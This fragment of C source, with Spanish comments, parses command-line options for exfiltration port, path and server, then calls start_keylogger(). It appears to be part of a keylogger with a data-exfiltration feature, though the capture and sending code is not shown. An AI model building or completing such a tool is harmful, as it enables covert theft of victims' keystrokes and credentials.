                strncpy(g_state.exfil.port, optarg, sizeof(g_state.exfil.port) - 1);
                g_state.exfil.port[sizeof(g_state.exfil.port) - 1] = '\0';
                break;
            case 256:  // --exfil-path
                strncpy(g_state.exfil.path, optarg, sizeof(g_state.exfil.path) - 1);
                g_state.exfil.path[sizeof(g_state.exfil.path) - 1] = '\0';
                break;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Validar opciones de exfiltración
    if (g_state.exfil.enabled && g_state.exfil.server[0] == '\0') {
        fprintf(stderr, "[!] Error: Exfiltración habilitada pero falta --server\n");
        print_usage(argv[0]);
        return 1;
    }
    
    return start_keylogger();
}
